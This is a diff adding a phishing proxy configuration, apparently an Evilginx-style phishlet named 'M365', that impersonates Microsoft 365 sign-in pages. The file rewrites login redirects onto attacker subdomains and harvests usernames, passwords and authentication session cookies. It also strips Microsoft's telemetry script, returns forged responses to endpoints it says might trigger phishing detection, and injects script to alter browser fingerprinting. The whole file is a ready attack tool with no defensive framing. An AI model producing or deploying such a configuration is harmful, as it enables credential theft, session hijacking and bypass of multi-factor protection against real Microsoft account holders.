@@ -1,0 +1,101 @@
+name: 'M365'
+author: 'Will'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'portal', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true} 
+  - {phish_sub: 'webmail', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true} 
+  - {phish_sub: 'static', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false, auto_filter: true} 
+  - {phish_sub: 'auth', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'images', orig_sub: 'aadcdn', domain: 'msftauthimages.net', session: false, is_landing: false, auto_filter: true} 
+  - {phish_sub: 'sso', orig_sub: 'autologon', domain: 'microsoftazuread-sso.com', session: false, is_landing: false, auto_filter: true}
+
+# URL rewriting to modify redirects
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://login.microsoftonline.com/common/oauth2/([^"])*', replace: 'https://{hostname}/common/oauth2/authorize', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}/([^"])*client-request-id=([^"&])*', replace: '{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '<script.*aria.js.*></script>', replace: '', mimes: ['text/html']}
+
+# Intercept rules for requests that might trigger phishing detection
+intercept:
+  - {domain: 'login.microsoftonline.com', path: '^/GetCredentialType\\.srf$', http_status: 200, body: '{"IfExistsResult":0,"Credentials":{"PrefCredential":1,"HasPassword":1}}', mime: "application/json"}
+  - {domain: 'login.microsoftonline.com', path: '^/GetSessionState\\.srf$', http_status: 200, body: '{"ErrorCode":0}', mime: "application/json"}
+
+auth_tokens:
+ - domain: '.login.microsoftonline.com'
+   keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'buid', 'esctx', 'ESTSSC', 'ESTSAUTHLIGHT', 'stsservicecookie', 'x-ms-gateway-slice']
+   type: 'cookie'
+ - domain: 'login.microsoftonline.com'
+   keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'buid', 'esctx', 'ESTSSC', 'ESTSAUTHLIGHT', 'stsservicecookie', 'x-ms-gateway-slice']
+   type: 'cookie'
+ - domain: '.microsoftonline.com'
+   keys: ['.*:regexp']
+   type: 'cookie'
+ - domain: 'microsoftonline.com'
+   keys: ['.*:regexp']
+   type: 'cookie'
+
+credentials:
+  username:
+    key: ""
+    search: '"username":"([^"]*)'
+    type: "json"
+  password:
+    key: ""
+    search: '"password":"([^"]*)'
+    type: "json"
+  username:
+    key: '(UserName)'
+    search: '(.*)'
+  password:
+    key: '(Password)'
+    search: '(.*)'
+  username:
+    key: '(login|UserName|username|email|account)'
+    search: '(.*)'
+    post: 'post'
+  password:
+    key: '(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORDS)'
+    search: '(.*)'
+    post: 'post'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+force_post:
+  - path: '/common/oauth2/authorize'
+    search:
+      - {key: 'response_type', search: '.*'}
+    force:
+      - {key: 'response_type', value: 'code'}
+      - {key: 'prompt', value: 'login'}
+    type: 'post'
+
+# Modify browser fingerprinting
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/"]
+    script: |
+      function stripTrackingParams() {
+        // Remove tracking params from URL
+        var urlParams = new URLSearchParams(window.location.search);
+        if(urlParams.has('client-request-id')) urlParams.delete('client-request-id');
+        if(urlParams.has('hpgrequestid')) urlParams.delete('hpgrequestid');
+        if(urlParams.has('sso_nonce')) urlParams.delete('sso_nonce');
+        window.history.replaceState({}, '', window.location.pathname + (urlParams.toString() ? '?' + urlParams.toString() : ''));
+        
+        // Add some randomization to DOM elements that might be fingerprinted
+        document.addEventListener('DOMContentLoaded', function() {
+          // Add slight variations to the DOM
+          var div = document.createElement('div');
+          div.style.position = 'absolute';
+          div.style.width = '1px';
+          div.style.height = '1px';
+          div.style.opacity = '0.01';
+          document.body.appendChild(div);
+        });
+      }
+      setTimeout(stripTrackingParams, 500);
+
